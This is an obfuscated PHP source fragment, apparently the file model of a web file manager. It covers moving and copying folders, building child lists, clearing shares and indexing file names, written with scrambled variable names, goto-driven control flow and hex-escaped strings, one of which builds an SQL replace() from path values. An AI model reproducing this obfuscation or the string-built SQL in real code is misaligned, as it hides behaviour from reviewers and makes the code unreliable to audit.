$dŸÃÕœåµä = array(); $cİêº†‰… = array(); goto eÌËÑ·ğëÌ; aêâŞ¥öÀĞ: $eÈÔˆ§ÜŒ = $this->_makeItemData($câ®İò‰°ô, $C›òğæ¤¬, $D—Õ·÷¿«’); Hook::trigger($E¦¯«Ù¦Å[503], $eÈÔˆ§ÜŒ); Hook::trigger($E¦¯«Ù¦Å[504], array($E¦¯«Ù¦Å[505], $eÈÔˆ§ÜŒ, 0)); goto fñø²ò¥å‰; fñø²ò¥å‰: $C†µì®”èÒ = $this->add($eÈÔˆ§ÜŒ); $A©£Â†‚ëĞ = array($E¦¯«Ù¦Å[365] => $C†µì®”èÒ, $E¦¯«Ù¦Å[28] => $D—Õ·÷¿«’); $this->_copyApplyMeta($A©£Â†‚ëĞ, $cº¬¾ì½ùˆ); goto f¹å›”Şë; E„ÍùŠÑ“¹: $this->addAll($cİêº†‰…, array(), !1); $dø‚Ààù©‰ = $this->where(array($E¦¯«Ù¦Å[456] => $C†µì®”èÒ))->select(); $eº‰˜ë²‰ = $this->_childrenMakeRelation($dŸÃÕœåµä, $dø‚Ààù©‰); goto E™“ğ×…¦’; bÏ‚­‰¾˜: $b£¶Ü¶†ß = $this->sourceInfo($C†µì®”èÒ); foreach ($dŸÃÕœåµä as $aùÖÏğ²») { $b£Öß‹ìÁ = $this->_makeItemData($aùÖÏğ²», $b£¶Ü¶†ß, $aùÖÏğ²»[$E¦¯«Ù¦Å[28]]); $b£Öß‹ìÁ[$E¦¯«Ù¦Å[454]] = $aùÖÏğ²»[$E¦¯«Ù¦Å[454]]; $cİêº†‰…[] = $b£Öß‹ìÁ; } $this->chunkEventSet($E¦¯«Ù¦Å[506], array($E¦¯«Ù¦Å[507], $eÈÔˆ§ÜŒ, $F·¼Ó¶Ïóå)); goto E„ÍùŠÑ“¹; B«Í‡‡Ş‡á: } private function _childrenMakeRelation($FíøÌ¹¼Ğâ, $D…¢ö§°ññ) { $FËù‡÷ßİ =& $_SERVER[Ìó]; $c›¾ø®¹ø¯ = array(); $bå‰Ä–½±à = array(); foreach ($FíøÌ¹¼Ğâ as $a÷Ã·ºîà) { $Fäâ‘ÑºÃ = $a÷Ã·ºîà[$FËù‡÷ßİ[28]] . $FËù‡÷ßİ[8] . $a÷Ã·ºîà[$FËù‡÷ßİ[454]]; $c›¾ø®¹ø¯[$Fäâ‘ÑºÃ] = $a÷Ã·ºîà[$FËù‡÷ßİ[365]]; } foreach ($D…¢ö§°ññ as $a÷Ã·ºîà) { $Fäâ‘ÑºÃ = $a÷Ã·ºîà[$FËù‡÷ßİ[28]] . $FËù‡÷ßİ[8] . $a÷Ã·ºîà[$FËù‡÷ßİ[454]]; $bäšå„ê†Ì = $c›¾ø®¹ø¯[$Fäâ‘ÑºÃ]; $bå‰Ä–½±à[$bäšå„ê†Ì] = $a÷Ã·ºîà[$FËù‡÷ßİ[365]]; } return $bå‰Ä–½±à; } private function _childrenMatch($e­ßæÖ¼ŒÏ, $F×¶¾¼Ì¨¿, $e¦ÈÍ •‚) { goto EÎ˜ÕÂÍ·¡; e†é…·Ä›©: $c¥«®¶øº = $bŒŸ¹¹æÛ[count($bŒŸ¹¹æÛ) - 1]; return array($bä·ãöÁ¨È[456] => $c¥«®¶øº, $bä·ãöÁ¨È[454] => $DÅŸ²‰È¿ ); goto bÁµµ¹‚Ÿ›; d†‰ùëÄ•‚: foreach ($eİ÷ÅŒ›Ïà as $a±²Ö’¨•Œ) { if (isset($e­ßæÖ¼ŒÏ[$a±²Ö’¨•Œ])) { $DÅŸ²‰È¿  .= $e­ßæÖ¼ŒÏ[$a±²Ö’¨•Œ] . $bä·ãöÁ¨È[512]; } } $DÅŸ²‰È¿  = rtrim($DÅŸ²‰È¿ , $bä·ãöÁ¨È[47]) . $bä·ãöÁ¨È[47]; $bŒŸ¹¹æÛ = $this->parentLevelArray($DÅŸ²‰È¿ ); goto e†é…·Ä›©; EÎ˜ÕÂÍ·¡: $bä·ãöÁ¨È =& $_SERVER[Ìó]; $DÅŸ²‰È¿  = $e¦ÈÍ •‚[$bä·ãöÁ¨È[454]]; $eİ÷ÅŒ›Ïà = $this->parentLevelArray($F×¶¾¼Ì¨¿[$bä·ãöÁ¨È[454]]); goto d†‰ùëÄ•‚; bÁµµ¹‚Ÿ›: } private function _makeItemData($f¯í¡ŠƒŒà, $dÖƒ‡¯èÀ , $D‚Ïëˆíï) { $F§¼µåÒÔ÷ =& $_SERVER[Ìó]; $BŒƒº÷ïÈÁ = array($F§¼µåÒÔ÷[513] => $f¯í¡ŠƒŒà[$F§¼µåÒÔ÷[366]], $F§¼µåÒÔ÷[382] => $D‚Ïëˆíï, $F§¼µåÒÔ÷[514] => $f¯í¡ŠƒŒà[$F§¼µåÒÔ÷[368]], $F§¼µåÒÔ÷[415] => $f¯í¡ŠƒŒà[$F§¼µåÒÔ÷[414]], $F§¼µåÒÔ÷[515] => $f¯í¡ŠƒŒà[$F§¼µåÒÔ÷[77]], $F§¼µåÒÔ÷[516] => $dÖƒ‡¯èÀ [$F§¼µåÒÔ÷[367]], $F§¼µåÒÔ÷[517] => $dÖƒ‡¯èÀ [$F§¼µåÒÔ÷[451]], $F§¼µåÒÔ÷[518] => USER_ID, $F§¼µåÒÔ÷[519] => USER_ID, $F§¼µåÒÔ÷[364] => $dÖƒ‡¯èÀ [$F§¼µåÒÔ÷[365]], $F§¼µåÒÔ÷[520] => $dÖƒ‡¯èÀ [$F§¼µåÒÔ÷[454]] . $dÖƒ‡¯èÀ [$F§¼µåÒÔ÷[365]] . $F§¼µåÒÔ÷[47], $F§¼µåÒÔ÷[391] => 0, $F§¼µåÒÔ÷[521] => $F§¼µåÒÔ÷[33]); return $BŒƒº÷ïÈÁ; } private function _copyApplyMeta($fìÌì¼‚, &$DåÈƒÒ¿œ’) { $a”†—’îèŠ =& $_SERVER[Ìó]; $F»ºøÙîÑÍ = $fìÌì¼‚[$a”†—’îèŠ[365]]; $d«ÅËôÍŒì = $fìÌì¼‚[$a”†—’îèŠ[28]]; if (!isset($fìÌì¼‚[$a”†—’îèŠ[522]]) || !$fìÌì¼‚[$a”†—’îèŠ[522]] || $fìÌì¼‚[$a”†—’îèŠ[522]] == $a”†—’îèŠ[463]) { $DåÈƒÒ¿œ’[$a”†—’îèŠ[498]][] = array($a”†—’îèŠ[365], $F»ºøÙîÑÍ, $a”†—’îèŠ[522], short_id($F»ºøÙîÑÍ)); } if (Input::check($d«ÅËôÍŒì, $a”†—’îèŠ[523])) { $DåÈƒÒ¿œ’[$a”†—’îèŠ[497]][] = array($a”†—’îèŠ[365] => $F»ºøÙîÑÍ, $a”†—’îèŠ[89] => $a”†—’îèŠ[411], $a”†—’îèŠ[355] => str_replace($a”†—’îèŠ[50], $a”†—’îèŠ[33], Pinyin::encode($d«ÅËôÍŒì))); $DåÈƒÒ¿œ’[$a”†—’îèŠ[497]][] = array($a”†—’îèŠ[365] => $F»ºøÙîÑÍ, $a”†—’îèŠ[89] => $a”†—’îèŠ[410], $a”†—’îèŠ[355] => Pinyin::encode($d«ÅËôÍŒì, $a”†—’îèŠ[524])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($FŞ”¸¹Ì) { goto Dƒõ“‘¾¦Ì; dŞ¢ì‹«¹–: $aö§ØïĞÖù = array_to_keyvalue($aö§ØïĞÖù, $D¶ñÙˆÕ[365]); foreach ($aö§ØïĞÖù as $BÕà„´…ø) { $E²®Î…íŠ = $BÕà„´…ø[$D¶ñÙˆÕ[456]]; $FŞ”¸¹Ì = $BÕà„´…ø[$D¶ñÙˆÕ[365]]; if (!isset($this->_childrenListCache[$FŞ”¸¹Ì]) && $BÕà„´…ø[$D¶ñÙˆÕ[366]] == $D¶ñÙˆÕ[83]) { $this->_childrenListCache[$FŞ”¸¹Ì] = array(); } if (!isset($this->_childrenListCache[$E²®Î…íŠ])) { $this->_childrenListCache[$E²®Î…íŠ] = array(); } $this->_childrenListCache[$E²®Î…íŠ][$FŞ”¸¹Ì] = $BÕà„´…ø; $this->_childrenItemCache[$FŞ”¸¹Ì] = $BÕà„´…ø; } goto d¢ƒ˜ºÀª§; Dƒõ“‘¾¦Ì: $D¶ñÙˆÕ =& $_SERVER[Ìó]; $DìÚ†öÎ—Á = $this->sourceInfo($FŞ”¸¹Ì); $cÁìÚæãŒ = $D¶ñÙˆÕ[525]; goto d˜Ä‰¢è±‰; d˜Ä‰¢è±‰: $BÛ¹îÉä¨Ì = array($D¶ñÙˆÕ[454] => array($D¶ñÙˆÕ[478], $DìÚ†öÎ—Á[$D¶ñÙˆÕ[454]] . $FŞ”¸¹Ì . $D¶ñÙˆÕ[479]), $D¶ñÙˆÕ[392] => $this->targetIsDelete); $aö§ØïĞÖù = $this->field($cÁìÚæãŒ)->where($BÛ¹îÉä¨Ì)->select(); if (!$aö§ØïĞÖù) { return; } goto dŞ¢ì‹«¹–; d¢ƒ˜ºÀª§: } private function _childrenListAll($BÄ‰¤ˆ­‚°, &$AÁ¦ï½„äš) { $eä˜ˆï„ =& $_SERVER[Ìó]; if (!isset($this->_childrenListCache[$BÄ‰¤ˆ­‚°])) { return; } $eäÙÖ†˜ßÚ = $this->_childrenListCache[$BÄ‰¤ˆ­‚°]; foreach ($eäÙÖ†˜ßÚ as $BÍ«êÉ…êó => $e´å„”‘¶Œ) { $AÁ¦ï½„äš[$BÍ«êÉ…êó] = $e´å„”‘¶Œ; if ($e´å„”‘¶Œ[$eä˜ˆï„[366]] == $eä˜ˆï„[83]) { $this->_childrenListAll($BÍ«êÉ…êó, $AÁ¦ï½„äš); } } } private function sourceInfoCache($Aò¢ò¥Àòœ) { if (isset($this->_childrenItemCache[$Aò¢ò¥Àòœ])) { return $this->_childrenItemCache[$Aò¢ò¥Àòœ]; } return $this->sourceInfo($Aò¢ò¥Àòœ); } private function _childrenList($fèâˆ’ùŒ–) { if (isset($this->_childrenListCache[$fèâˆ’ùŒ–])) { return $this->_childrenListCache[$fèâˆ’ùŒ–]; } return $this->_childrenListSelect($fèâˆ’ùŒ–); } private function _childrenListSelect($eÄ¤î¶¤Ãƒ) { goto CŒÔé®¡ã³; fµª Ì•“: $BÄŸà‘¾ÆÑ = $BÄŸà‘¾ÆÑ ? $BÄŸà‘¾ÆÑ : array(); $A—ÌõÍ÷çÊ = array_to_keyvalue($BÄŸà‘¾ÆÑ, $A”İ¾ÄÈ¼¾[365]); $this->_childrenListCache[$eÄ¤î¶¤Ãƒ] = $A—ÌõÍ÷çÊ; goto f×ª£´§ëŸ; CŒÔé®¡ã³: $A”İ¾ÄÈ¼¾ =& $_SERVER[Ìó]; $aÅÚµË¼™Å = array($A”İ¾ÄÈ¼¾[456] => $eÄ¤î¶¤Ãƒ, $A”İ¾ÄÈ¼¾[392] => $this->targetIsDelete); $BÄŸà‘¾ÆÑ = $this->where($aÅÚµË¼™Å)->select(); goto fµª Ì•“; f×ª£´§ëŸ: foreach ($A—ÌõÍ÷çÊ as $eÄ¤î¶¤Ãƒ => $Fä‚ÄŒÜğÌ) { $this->_childrenItemCache[$eÄ¤î¶¤Ãƒ] = $Fä‚ÄŒÜğÌ; } return $A—ÌõÍ÷çÊ; goto dáÔàé†Êã; dáÔàé†Êã: } private function fileNameExistCache($E®£‰ŒŸƒ§, $dªËÎåº“˜) { $EóØä‹à =& $_SERVER[Ìó]; $dªËÎåº“˜ = strtolower($dªËÎåº“˜); $f‰Ú¯†·Š = $this->_childrenList($E®£‰ŒŸƒ§); foreach ($f‰Ú¯†·Š as $CÆ ÚãñšÒ) { if ($dªËÎåº“˜ == strtolower($CÆ ÚãñšÒ[$EóØä‹à[28]])) { return $CÆ ÚãñšÒ[$EóØä‹à[365]]; } } return !1; } private function fileNameAutoCache($c›½º£«£–, $f•‹‡¶ÆˆÕ, $cµ‰Ë†¿ø¡, $däÈìò‹Ê‡) { $FËøÔÒ”öğ =& $_SERVER[Ìó]; $Eğ´¿¶…“æ = $this->_childrenList($c›½º£«£–); $EÚ¼Èæ ° = array_to_keyvalue($Eğ´¿¶…“æ, $FËøÔÒ”öğ[33], $FËøÔÒ”öğ[28]); return $this->fileNameAutoGet($EÚ¼Èæ °, $f•‹‡¶ÆˆÕ, $cµ‰Ë†¿ø¡, $däÈìò‹Ê‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($AÂØ©ßÒ, $EË™µ†à·, $BîŠ­ÅÛ©† = REPEAT_REPLACE, $E ¸ÅñêŠˆ = '') { goto aô»µ‰‚; B˜Áùåˆ¨´: $e³øõ–ÊÅ = array($aÓ†¡å¾·†[$EÆË ¼ì[456]], $EË™µ†à·); if ($aÓ†¡å¾·†[$EÆË ¼ì[366]] == $EÆË ¼ì[83]) { $e³øõ–ÊÅ[] = $AÂØ©ßÒ; } $this->updateModifyTime($e³øõ–ÊÅ); goto e”ˆÚ¬Ö©æ; F®÷¢´·Š: Hook::trigger($EÆË ¼ì[526], $fË­ïÚğ £); $this->targetIsDelete = intval($aÓ†¡å¾·†[$EÆË ¼ì[392]]); if ($aÓ†¡å¾·†[$EÆË ¼ì[456]] == $EË™µ†à· && $E ¸ÅñêŠˆ != $aÓ†¡å¾·†[$EÆË ¼ì[28]]) { $AºÙ÷“èñ = $this->fileNameExist($EË™µ†à·, $E ¸ÅñêŠˆ); if ($AºÙ÷“èñ && $aÓ†¡å¾·†[$EÆË ¼ì[366]] == $EÆË ¼ì[463]) { goto BÁŒ©»ô¥ì; BÁŒ©»ô¥ì: $c‘ƒ¥Â»Ş = $this->sourceInfo($AºÙ÷“èñ); $B£ØŒªææÍ = $this->fileHistory($c‘ƒ¥Â»Ş, $aÓ†¡å¾·†[$EÆË ¼ì[414]], $aÓ†¡å¾·†[$EÆË ¼ì[77]]); if (!$B£ØŒªææÍ) { Model($EÆË ¼ì[417])->remove($aÓ†¡å¾·†[$EÆË ¼ì[414]]); } goto D£Åò‡ğò”; D£Åò‡ğò”: $this->removeNow($AÂØ©ßÒ, !1); $this->folderSizeReset($EË™µ†à·); Hook::trigger($EÆË ¼ì[527], $fË­ïÚğ £); goto A˜Šî¡Ê; A˜Šî¡Ê: return $AºÙ÷“èñ; goto d³£Ô‰­èÎ; d³£Ô‰­èÎ: } } goto a¼’‹ïç¨¹; Cİ®çª¦ç: $fË­ïÚğ £ = $this->pathInfoMore($AÂØ©ßÒ); if ($this->isParentOf($AÂØ©ßÒ, $EË™µ†à·)) { return !1; } if (!$aÓ†¡å¾·† || !$Aù Ÿ¨¯åĞ || $Aù Ÿ¨¯åĞ[$EÆË ¼ì[366]] != $EÆË ¼ì[83]) { return !1; } goto F®÷¢´·Š; e”ˆÚ¬Ö©æ: Model($EÆË ¼ì[500])->eventMove($AÂØ©ßÒ, $aÓ†¡å¾·†[$EÆË ¼ì[456]], $EË™µ†à·); Hook::trigger($EÆË ¼ì[527], $fË­ïÚğ £); return $FîØéë²»™; goto b®Çö¶Åä“; CÔ× ›ö‰Å: $this->lockWriteEnd($EË™µ†à·, $bÊ©‚‡Œßš); $this->folderSizeReset($aÓ†¡å¾·†[$EÆË ¼ì[456]]); $this->folderSizeReset($EË™µ†à·); goto B˜Áùåˆ¨´; a¼’‹ïç¨¹: $bÊ©‚‡Œßš = $E ¸ÅñêŠˆ ? $E ¸ÅñêŠˆ : $aÓ†¡å¾·†[$EÆË ¼ì[28]]; $this->lockMoveStart($AÂØ©ßÒ); $this->lockWriteStart($EË™µ†à·, $bÊ©‚‡Œßš); goto eÛ›‚Ã¥Á; eÛ›‚Ã¥Á: $a‰ë„ì¬°ï = array($EÆË ¼ì[496] => array(), $EÆË ¼ì[528] => !1); $this->clearShare($AÂØ©ßÒ, $EË™µ†à·); $cŸŠµ‰‰Ö = $this->fileNameExistCache($EË™µ†à·, $aÓ†¡å¾·†[$EÆË ¼ì[28]]); goto Eæš‘±‰Ü·; fÀ–»ªÒ†: Model($EÆË ¼ì[163])->linkAdd($a‰ë„ì¬°ï[$EÆË ¼ì[496]]); if ($cŸŠµ‰‰Ö && $a‰ë„ì¬°ï[$EÆË ¼ì[528]]) { $this->removeNow($AÂØ©ßÒ, !1); } $this->lockMoveEnd($AÂØ©ßÒ); goto CÔ× ›ö‰Å; Eæš‘±‰Ü·: $FîØéë²»™ = $this->_move($AÂØ©ßÒ, $EË™µ†à·, $BîŠ­ÅÛ©†, $a‰ë„ì¬°ï, $E ¸ÅñêŠˆ); $this->sourceCacheClear(); if ($aÓ†¡å¾·†[$EÆË ¼ì[366]] == $EÆË ¼ì[83] && $cŸŠµ‰‰Ö) { $this->folderSizeResetChildren($FîØéë²»™); } goto fÀ–»ªÒ†; aô»µ‰‚: $EÆË ¼ì =& $_SERVER[Ìó]; $aÓ†¡å¾·† = $this->sourceInfo($AÂØ©ßÒ); $Aù Ÿ¨¯åĞ = $this->sourceInfo($EË™µ†à·); goto Cİ®çª¦ç; b®Çö¶Åä“: } private function _move($E‹—•¿î±É, $A¼©â­˜Ë, $bš®ùä«‘¶, &$fã —Û™…¹, $Aòº½ˆç = '') { goto eÖõ¹Î‘¼; eÖõ¹Î‘¼: $EÌ‡™‡‡«¯ =& $_SERVER[Ìó]; $d´¨áË˜Ù› = $this->sourceInfo($E‹—•¿î±É); $fñÃŸ§İ÷± = $d´¨áË˜Ù›[$EÌ‡™‡‡«¯[366]] == $EÌ‡™‡‡«¯[83]; goto A’î£¶„ˆâ; B•÷‰¼îï¶: return $C•ÆÛ»¶šº; goto Ağ»Ÿ”„ä; B© ö÷í¾–: $fÍš´ÌÛ = !1; if ($fñÃŸ§İ÷±) { if ($bš®ùä«‘¶ == REPEAT_RENAME_FOLDER) { $FŠù†ìœÄá = $this->fileNameAuto($A¼©â­˜Ë, $FŠù†ìœÄá, $bš®ùä«‘¶, $fñÃŸ§İ÷±); $C•ÆÛ»¶šº = $this->_moveForce($E‹—•¿î±É, $A¼©â­˜Ë, $FŠù†ìœÄá); } else { if ($bš®ùä«‘¶ == REPEAT_RENAME_FOLDER) { $bš®ùä«‘¶ = REPEAT_RENAME; } $dÇì·¨Í‰– = $this->_childrenListSelect($E‹—•¿î±É); foreach ($dÇì·¨Í‰– as $b±÷ˆÖŠ) { $this->_move($b±÷ˆÖŠ[$EÌ‡™‡‡«¯[365]], $f…Ê…¥Ôè•, $bš®ùä«‘¶, $fã —Û™…¹); } $fÍš´ÌÛ = !0; } } else { if ($bš®ùä«‘¶ == REPEAT_SKIP) { $fÍš´ÌÛ = !0; } else { if ($bš®ùä«‘¶ == REPEAT_RENAME || $bš®ùä«‘¶ == REPEAT_RENAME_FOLDER) { $FŠù†ìœÄá = $this->fileNameAuto($A¼©â­˜Ë, $FŠù†ìœÄá, $bš®ùä«‘¶, $fñÃŸ§İ÷±); $C•ÆÛ»¶šº = $this->_moveForce($E‹—•¿î±É, $A¼©â­˜Ë, $FŠù†ìœÄá); } else { if ($bš®ùä«‘¶ == REPEAT_REPLACE) { $aáœÕøØ²· = $this->sourceInfoCache($f…Ê…¥Ôè•); $f¨±±âªÎ = $this->fileHistory($aáœÕøØ²·, $d´¨áË˜Ù›[$EÌ‡™‡‡«¯[414]], $d´¨áË˜Ù›[$EÌ‡™‡‡«¯[77]]); if ($f¨±±âªÎ) { $fã —Û™…¹[$EÌ‡™‡‡«¯[496]][] = $d´¨áË˜Ù›[$EÌ‡™‡‡«¯[414]]; } else { $fÍš´ÌÛ = !0; } } } } } if ($fÍš´ÌÛ && !$fã —Û™…¹[$EÌ‡™‡‡«¯[528]]) { $fã —Û™…¹[$EÌ‡™‡‡«¯[528]] = !0; } goto B•÷‰¼îï¶; A’î£¶„ˆâ: $FŠù†ìœÄá = $Aòº½ˆç ? $Aòº½ˆç : $d´¨áË˜Ù›[$EÌ‡™‡‡«¯[28]]; $f…Ê…¥Ôè• = $this->fileNameExistCache($A¼©â­˜Ë, $FŠù†ìœÄá); $this->lockMoveStart($E‹—•¿î±É); goto EÆÈ…ˆ›¼Ò; EÆÈ…ˆ›¼Ò: $this->lockWriteStart($A¼©â­˜Ë, $FŠù†ìœÄá); if (!$f…Ê…¥Ôè•) { return $this->_moveForce($E‹—•¿î±É, $A¼©â­˜Ë, $FŠù†ìœÄá); } $C•ÆÛ»¶šº = $f…Ê…¥Ôè•; goto B© ö÷í¾–; Ağ»Ÿ”„ä: } private function _moveForce($F®‰õù¤‰, $cõ˜ƒ×á», $a½ª„†Õ…á) { goto D¦é£ó¦ˆ; D¦é£ó¦ˆ: $bé¹ñ« ” =& $_SERVER[Ìó]; $b‚Ûé®Æ”· = $this->sourceInfo($F®‰õù¤‰); $C†„—¢¾•ç = $this->sourceInfo($cõ˜ƒ×á»); goto a¾ÙğĞ“óó; A×®ÁƒÜÖ: if (!$a¯æİÁ©ã) { Model($bé¹ñ« ”[449])->authClear($F®‰õù¤‰); } $c‡ãí¥›‡ƒ = $b‚Ûé®Æ”·[$bé¹ñ« ”[392]] == $bé¹ñ« ”[83] && $C†„—¢¾•ç[$bé¹ñ« ”[392]] != $bé¹ñ« ”[83]; if ($c‡ãí¥›‡ƒ) { $C¬ŞÀ‰áá[$bé¹ñ« ”[391]] = 0; } goto dÄ¦À©; dÄ¦À©: if ($FÔîÚÀ¨¹) { $FçëÙÙŞœ– = array($bé¹ñ« ”[520] => array($bé¹ñ« ”[478], $b‚Ûé®Æ”·[$bé¹ñ« ”[454]] . $b‚Ûé®Æ”·[$bé¹ñ« ”[365]] . $bé¹ñ« ”[479])); $bëšÌÎĞÆŒ = $b‚Ûé®Æ”·[$bé¹ñ« ”[454]] . $b‚Ûé®Æ”·[$bé¹ñ« ”[365]] . $bé¹ñ« ”[47]; $fíŠ‚ÛøË = $C†„—¢¾•ç[$bé¹ñ« ”[454]] . $C†„—¢¾•ç[$bé¹ñ« ”[365]] . $bé¹ñ« ”[47] . $b‚Ûé®Æ”·[$bé¹ñ« ”[365]] . $bé¹ñ« ”[47]; $eä½ÂÅ–ñ = array($bé¹ñ« ”[520] => array($bé¹ñ« ”[529], "\x72\x65\160\154\x61\x63\x65\x28\x70\141\x72\145\156\164\x4c\145\166\145\154\54\47{$bëšÌÎĞÆŒ}\x27\54\47{$fíŠ‚ÛøË}\x27\51"), $bé¹ñ« ”[516] => $C†„—¢¾•ç[$bé¹ñ« ”[367]], $bé¹ñ« ”[517] => $C†„—¢¾•ç[$bé¹ñ« ”[451]]); if ($c‡ãí¥›‡ƒ) { $eä½ÂÅ–ñ[$bé¹ñ« ”[391]] = 0; } $this->where($FçëÙÙŞœ–)->data($eä½ÂÅ–ñ)->save(); } $this->where(array($bé¹ñ« ”[379] => $F®‰õù¤‰))->data($C¬ŞÀ‰áá)->save(); return $F®‰õù¤‰; goto E‰¦õºç‰; a¾ÙğĞ“óó: $FÔîÚÀ¨¹ = $b‚Ûé®Æ”·[$bé¹ñ« ”[366]] == $bé¹ñ« ”[83]; $C¬ŞÀ‰áá = array($bé¹ñ« ”[364] => $C†„—¢¾•ç[$bé¹ñ« ”[365]], $bé¹ñ« ”[520] => $C†„—¢¾•ç[$bé¹ñ« ”[454]] . $C†„—¢¾•ç[$bé¹ñ« ”[365]] . $bé¹ñ« ”[47], $bé¹ñ« ”[516] => $C†„—¢¾•ç[$bé¹ñ« ”[367]], $bé¹ñ« ”[517] => $C†„—¢¾•ç[$bé¹ñ« ”[451]], $bé¹ñ« ”[519] => USER_ID, $bé¹ñ« ”[382] => $a½ª„†Õ…á); $a¯æİÁ©ã = $b‚Ûé®Æ”·[$bé¹ñ« ”[367]] == SourceModel::TYPE_GROUP && $C†„—¢¾•ç[$bé¹ñ« ”[367]] == SourceModel::TYPE_GROUP && $b‚Ûé®Æ”·[$bé¹ñ« ”[451]] == $C†„—¢¾•ç[$bé¹ñ« ”[451]]; goto A×®ÁƒÜÖ; E‰¦õºç‰: } private function clearShare($Cƒ»‹Ã‹¿Ö, $cŸ¡ÎÇÂ’ë) { goto DØâáË—„ó; Aİ›¬ğ¡: if (!$BçøÔ¢¹Šé) { return; } $f„†¡‡©… = array($cÎºÁª…á[365] => array($cÎºÁª…á[7], $BçøÔ¢¹Šé), $cÎºÁª…á[443] => 1); $b»²’æ¤…ñ = Model($cÎºÁª…á[531])->field($cÎºÁª…á[436])->where($f„†¡‡©…)->select(); goto F²…·Ã„¦ƒ; F²…·Ã„¦ƒ: if (!$b»²’æ¤…ñ) { return; } $b»²’æ¤…ñ = array_to_keyvalue($b»²’æ¤…ñ, $cÎºÁª…á[33], $cÎºÁª…á[436]); $f„†¡‡©… = array($cÎºÁª…á[436] => array($cÎºÁª…á[7], $b»²’æ¤…ñ)); goto bµØš£¥ğ; bµØš£¥ğ: Model($cÎºÁª…á[531])->where($f„†¡‡©…)->save(array($cÎºÁª…á[443] => 0)); Model($cÎºÁª…á[532])->where($f„†¡‡©…)->delete(); goto bîÁÅØ„; a‰¡‘èóÍÙ: if ($fóİªË“¶º[$cÎºÁª…á[451]] == $A´˜‘İÏĞ[$cÎºÁª…á[451]] && $fóİªË“¶º[$cÎºÁª…á[367]] == $cÎºÁª…á[530]) { return; } $f„†¡‡©… = array($cÎºÁª…á[454] => array($cÎºÁª…á[478], $fóİªË“¶º[$cÎºÁª…á[454]] . $Cƒ»‹Ã‹¿Ö . $cÎºÁª…á[479])); $BçøÔ¢¹Šé = $this->field($cÎºÁª…á[379])->where($f„†¡‡©…)->getField($cÎºÁª…á[365], !0); goto Aİ›¬ğ¡; DØâáË—„ó: $cÎºÁª…á =& $_SERVER[Ìó]; $fóİªË“¶º = $this->sourceInfo($Cƒ»‹Ã‹¿Ö); $A´˜‘İÏĞ = $this->sourceInfo($cŸ¡ÎÇÂ’ë); goto a‰¡‘èóÍÙ; bîÁÅØ„: } public function copyFolderFromIO($BªÇÌŠœµÏ, $dàÌ—¹Ô’, $EÚ†°ŒÅƒ·, $dÃîÍ Õ, $e÷ñ¦Î‹µ, $bÁ¤Ëçî…„ = false) { goto EöİĞœ‘î³; CÒó¥ôÚà: $FíË´ğô¤ = $this->fileNameExist($EÚ†°ŒÅƒ·, $A“ôÆÈ¸è); $Aˆˆ—Éåó„ = $this->mkdir($EÚ†°ŒÅƒ·, $A“ôÆÈ¸è, $dÃîÍ Õ); if (!$FíË´ğô¤ || $dÃîÍ Õ == REPEAT_RENAME_FOLDER) { $dÃîÍ Õ = !1; } goto bµß‰ßÜÁÅ; EöİĞœ‘î³: $c­ÉïÈŞ» =& $_SERVER[Ìó]; $F© Éğ“Ø = array($c­ÉïÈŞ»[497] => array(), $c­ÉïÈŞ»[498] => array(), $c­ÉïÈŞ»[496] => array(), $c­ÉïÈŞ»[533] => array()); $A“ôÆÈ¸è = $bÁ¤Ëçî…„ ? $bÁ¤Ëçî…„ : $BªÇÌŠœµÏ->getPathName($BªÇÌŠœµÏ->pathThis($dàÌ—¹Ô’)); goto CÒó¥ôÚà; C†ÈÑ‹¹­: $this->updateModifyTime($EÚ†°ŒÅƒ·); return $Aˆˆ—Éåó„; goto eƒŒóù”†¸; BØƒ¯Ú¼™ª: Model($c­ÉïÈŞ»[499])->addAll($F© Éğ“Ø[$c­ÉïÈŞ»[497]], array(), !0); Model($c­ÉïÈŞ»[500])->eventCopy($Aˆˆ—Éåó„); $this->saveAll($F© Éğ“Ø[$c­ÉïÈŞ»[498]]); goto dìø˜ÃåÈ¬; dìø˜ÃåÈ¬: Model($c­ÉïÈŞ»[417])->linkAdd($F© Éğ“Ø[$c­ÉïÈŞ»[496]]); Model($c­ÉïÈŞ»[417])->remove($F© Éğ“Ø[$c­ÉïÈŞ»[533]]); $this->folderSizeReset($EÚ†°ŒÅƒ·); goto C†ÈÑ‹¹­; f®¾„¦öß: Hook::trigger($c­ÉïÈŞ»[535]); if ($Aˆˆ—Éåó„) { $this->folderSizeResetChildren($Aˆˆ—Éåó„); } $this->_childrenListClear(); goto BØƒ¯Ú¼™ª; bµß‰ßÜÁÅ: if ($FíË´ğô¤) { $this->_childrenAllMake($FíË´ğô¤); } Hook::trigger($c­ÉïÈŞ»[534]); $this->_copyChildTo($BªÇÌŠœµÏ, $dàÌ—¹Ô’, $Aˆˆ—Éåó„, $dÃîÍ Õ, $F© Éğ“Ø, $e÷ñ¦Î‹µ); goto f®¾„¦öß; eƒŒóù”†¸: } private function _copyChildTo($A†§¶‘ÉÆš, $a¾Ó¬Ã¾ã“, $f‚ïé¨óäÌ, $fÚèğ¤ôÅ, &$A£ˆéÍ”Šš, $FíÒá£ö‚µ) { goto BÊ¤ÉŸÛß‰; fñœšŸ×®º: foreach ($A×î¨½àõÊ as &$a…ôŒ³È â) { goto aÛ·Ş²ò¦×; F ğó„¿ˆ: $a…ôŒ³È â[$b±“«˜’¡Ú[77]] = _get($a…ôŒ³È â, $b±“«˜’¡Ú[77], 0); $a…ôŒ³È â[$b±“«˜’¡Ú[414]] = _get($a…ôŒ³È â, $b±“«˜’¡Ú[414], 0); if (!isset($a…ôŒ³È â[$b±“«˜’¡Ú[536]]) && $a…ôŒ³È â[$b±“«˜’¡Ú[414]]) { $A£ˆéÍ”Šš[$b±“«˜’¡Ú[533]][] = $a…ôŒ³È â[$b±“«˜’¡Ú[414]]; } goto Cİ£ó‰ß; aÛ·Ş²ò¦×: if (isset($B££Ô‹¦÷ª[$a…ôŒ³È â[$b±“«˜’¡Ú[28]]])) { $a…ôŒ³È â = $B££Ô‹¦÷ª[$a…ôŒ³È â[$b±“«˜’¡Ú[28]]]; } $a…ôŒ³È â[$b±“«˜’¡Ú[366]] = $a…ôŒ³È â[$b±“«˜’¡Ú[29]] == $b±“«˜’¡Ú[76]; $a…ôŒ³È â[$b±“«˜’¡Ú[368]] = _get($a…ôŒ³È â, $b±“«˜’¡Ú[156], 